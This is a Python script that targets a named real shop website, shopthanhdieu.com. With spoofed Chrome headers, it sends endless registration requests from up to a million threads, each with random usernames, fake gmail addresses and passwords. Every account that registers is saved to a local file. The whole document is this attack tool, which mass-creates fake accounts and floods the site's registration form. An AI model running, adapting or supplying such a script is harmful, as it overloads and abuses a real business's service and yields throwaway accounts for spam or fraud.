import requests,random,string,threading
def main():
  headers = {
    'authority': 'shopthanhdieu.com/',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'upgrade-insecure-requests': '1',
    'origin': 'https://shopthanhdieu.com/',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-user': '?1',
    'sec-fetch-dest': 'document',
    'referer': 'https://shopthanhdieu.com//reg.html',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': '',
}
  while True:
    st = ''.join((random.choice(string.ascii_lowercase) for x in range(20)))
    data = {
    'ci_csrf_token': '',
    'name': st,
    'email': f'{st}@gmail.com',
    'password': st,
    'password1': st
  }
    response = requests.post('https://shopthanhdieu.com//reg.html', headers=headers, data=data)
    success = "Dang ki thanh cong se chuyen ve dang nhap trong 3 seconds..."
    if success in response.text:
      out = f"{st}|{st}@gmail.com|{st}"
      open("thanhdieu.txt","a+").write(f'{out}\n')
      print(out)
    else:
      print(response.text)
for i in range(1000000):
  new_thread = threading.Thread(target=main, args=()).start()